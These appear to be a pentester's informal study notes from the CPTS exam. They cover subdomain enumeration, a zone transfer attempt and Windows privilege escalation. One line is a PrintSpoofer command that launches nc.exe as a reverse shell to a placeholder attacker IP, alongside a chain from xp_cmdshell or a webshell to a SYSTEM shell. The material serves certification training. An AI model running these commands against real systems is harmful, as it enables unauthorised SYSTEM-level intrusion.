ok off rip, ffuf for all subdomains and or vHosts.. 
add to etc/hosts and a text file
run nmap on them all granted prolly gonna be the smae ports and protocols but for reporting its good
if we want to be lil extra run ffuf off the sub domains 
whatweb them subdomains and get that info  
ALSO dig axfr maindomain.com @<externalIP>   -> this will give us extra or confirm our findings 

eyewittness will prolly help too... initial access prolly gonna come from this... remember to like double or triple enumerate... if no easy wins... back to enumeration. 


make sure to just download or move or just have ready all tools, static nmap, anything on desktop or easy to find folder... if there are command injections see what we can see with curl and burp 

burp can be more helpful sometimes than curl and vice versa..  

sharphound.exe lololol huge help today.

Upload PrintSpoofer64.exe + nc.exe

PrintSpoofer64.exe -c "nc.exe attacker_ip attacker_port -e cmd"

NT AUTHORITY\SYSTEM shell = ðŸ’°

ðŸ§ª CPTS Patterns
ðŸ§· Why PrintSpoofer?
Because it abuses SeImpersonate to spawn a SYSTEM shell via named pipe hijack.
The CPTS exam LOVES this because itâ€™s fast, clean, and easy to chain with nc.exe.

ðŸ§· Why nc.exe?
They want you to show you can exfil a shell (especially through webshells or limited cmd interfaces).


xp_cmdshell or webshell
â†’ whoami
â†’ whoami /priv
â†’ SeImpersonate? = PrintSpoofer
â†’ Get nc.exe up there too
â†’ SYSTEM shell


we remembered the sudo su shells which helped us a ton on mental fatigue when commands didnt work lol. 

maybe better reporting and writing..? but overall good work with everything going on. gg buck.
